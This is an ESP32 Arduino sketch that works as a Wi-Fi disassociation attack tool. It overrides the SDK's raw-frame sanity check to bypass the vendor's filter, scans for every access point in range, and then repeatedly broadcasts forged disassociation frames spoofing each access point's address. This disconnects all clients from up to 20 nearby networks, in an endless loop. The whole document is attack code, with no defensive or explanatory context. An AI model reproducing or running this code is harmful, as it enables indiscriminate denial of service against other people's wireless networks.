#include <WiFi.h>
#include <esp_wifi.h>

extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
  return 0; // bypass SDK filter
}

#define MAX_TARGETS 20
#define DISASSOC_REASON 0x08 // Inactivity (can change to 0x01, 0x07, etc.)
#define DISASSOC_COUNT 20
#define LOOP_DELAY 5000
#define LED_PIN 2 // onboard blue LED

struct Target {
  uint8_t bssid[6];
  int channel;
  String ssid;
};

Target targets[MAX_TARGETS];
int targetCount = 0;

void sendDisassoc(uint8_t *bssid) {
  uint8_t packet[26] = {
    0xA0, 0x00,
    0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    0x00, 0x00,
    DISASSOC_REASON, 0x00
  };

  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);

  // Blink onboard LED
  digitalWrite(LED_PIN, HIGH);
  delay(5);
  digitalWrite(LED_PIN, LOW);
}

void setup() {
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW); // start off
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(1000);

  Serial.println("Scanning for APs...");
  int n = WiFi.scanNetworks();
  Serial.printf("Found %d networks\n", n);

  for (int i = 0; i < n && targetCount < MAX_TARGETS; ++i) {
    String ssid = WiFi.SSID(i);
    if (ssid.length() == 0) continue;

    memcpy(targets[targetCount].bssid, WiFi.BSSID(i), 6);
    targets[targetCount].channel = WiFi.channel(i);
    targets[targetCount].ssid = ssid;
    Serial.printf("Loaded: %s | BSSID: %s | Channel: %d\n",
                  ssid.c_str(), WiFi.BSSIDstr(i).c_str(), WiFi.channel(i));
    targetCount++;
  }

  Serial.printf("Ready to disassociate all clients from %d APs\n", targetCount);
}

void loop() {
  for (int i = 0; i < targetCount; ++i) {
    esp_wifi_set_channel(targets[i].channel, WIFI_SECOND_CHAN_NONE);
    Serial.printf("Disassociating clients from: %s on channel %d\n",
                  targets[i].ssid.c_str(), targets[i].channel);

    for (int j = 0; j < DISASSOC_COUNT; ++j) {
      sendDisassoc(targets[i].bssid);
      delay(10);
    }
  }

  Serial.println("Loop complete. Waiting...");
  delay(LOOP_DELAY);
}